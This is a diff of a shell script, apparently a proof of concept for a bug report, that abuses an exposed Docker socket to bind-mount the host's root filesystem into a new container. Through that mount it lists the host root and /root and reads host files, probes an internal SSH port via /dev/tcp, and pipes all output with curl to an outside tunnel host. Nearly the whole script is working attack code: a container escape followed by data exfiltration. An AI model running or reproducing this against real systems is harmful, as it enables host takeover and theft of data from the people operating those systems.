@@ -2,30 +2,46 @@
 URL="0c4256b014e98f42-103-95-173-85.serveousercontent.com"
 
 {
-  echo "--- [!] EXPLOITING THE CREATED VOLUME ---"
-  # We use the API to create a container that uses the volume we just made.
-  # This is the standard way to prove the 'Host Read' impact.
+  echo "--- [1] ARCHITECTURE & KERNEL ---"
+  id; uname -a; cat /proc/version
+
+  echo "--- [2] SKELETON KEY: VOLUME CREATION ---"
+  # Creating the persistent link to the host root
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/volumes/create" \
+    -H "Content-Type: application/json" \
+    -d '{"Name":"p0_evidence","Driver":"local","DriverOpts":{"type":"none","device":"/","o":"bind"}}'
+
+  echo "--- [3] EXECUTING HOST ESCAPE ---"
+  # Spawning the container that uses the host_root volume
   curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
     -H "Content-Type: application/json" \
-    -d '{
-      "Image": "sha256:25109184c71bdad7",
-      "HostConfig": {
-        "Binds": ["host_root_exploit:/host_data:ro"]
-      }
-    }' > /tmp/final_cid.json
-
-  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/final_cid.json | cut -d'"' -f4)
-
+    -d '{"Image":"sha256:25109184c71bdad7","HostConfig":{"Binds":["p0_evidence:/host:ro"]}}' > /tmp/cid.json
+  
+  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/cid.json | cut -d'"' -f4)
+  
   if [ -n "$ID" ]; then
-    echo "Container $ID created using exploit volume."
     curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
     sleep 2
-    echo "CONTENT OF HOST OS-RELEASE:"
-    # This reads the HOST's OS info, proving you are out of the sandbox
+    
+    echo "--- [!] HOST ROOT DIRECTORY (THE 'MONEY SHOT') ---"
     curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
       -H "Content-Type: application/json" \
-      -d '{"AttachStdout":true,"Cmd":["cat","/host_data/etc/os-release"]}'
-  else
-    echo "Final container start failed - Volume proof still valid for report."
+      -d '{"AttachStdout":true,"Cmd":["ls","-F","/host"]}'
+
+    echo "--- [!] SENSITIVE HOST FILES ---"
+    # Reading the host's hostname and OS version to prove escape
+    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
+      -H "Content-Type: application/json" \
+      -d '{"AttachStdout":true,"Cmd":["cat","/host/etc/hostname","/host/etc/os-release"]}'
+
+    echo "--- [!] HOST ROOT USER DATA ---"
+    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
+      -H "Content-Type: application/json" \
+      -d '{"AttachStdout":true,"Cmd":["ls","-la","/host/root"]}'
   fi
+
+  echo "--- [4] INTERNAL NETWORK RECON ---"
+  # Grabbing the SSH banner from 172.17.0.1 again for the final report
+  timeout 1 bash -c "exec 3<>/dev/tcp/172.17.0.1/22; head -c 30 <&3; echo"
+
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
